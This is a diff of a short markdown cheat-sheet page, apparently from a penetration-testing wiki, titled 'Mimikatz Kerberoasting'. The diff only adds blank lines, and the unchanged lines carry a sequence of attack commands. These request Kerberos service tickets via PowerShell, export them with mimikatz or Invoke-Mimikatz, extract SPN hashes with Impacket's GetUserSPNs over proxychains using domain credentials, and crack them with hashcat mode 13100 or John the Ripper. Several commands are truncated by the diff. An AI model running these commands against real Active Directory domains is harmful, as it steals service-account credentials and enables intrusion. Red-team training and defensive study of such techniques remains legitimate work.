@@ -9,6 +9,8 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # Mimikatz Kerberoasting
 
+
+
 **Command** ([[Command]]):
 
 ```bash
@@ -16,7 +18,13 @@ Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tok
 
 ```
 
+
+
+
+
 Use mimikatz to export SPN Tikets
+
+
 
 **Command** ([[Export Kerberos List]]):
 
@@ -25,6 +33,12 @@ mimkatz kerberos::list /export
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Export SPN tickets]]):
 
 ```bash
@@ -32,7 +46,13 @@ Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'
 
 ```
 
+
+
+
+
 Output hashes in the correct format for John, Proxychains & Beacon
+
+
 
 **Command** ([[Impacket method of extracting SPN tickets]]):
 
@@ -41,9 +61,21 @@ proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Cracking the hashes]]):
 
 ```bash
 hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist=
 
 ```
+
+
+
+
+
+
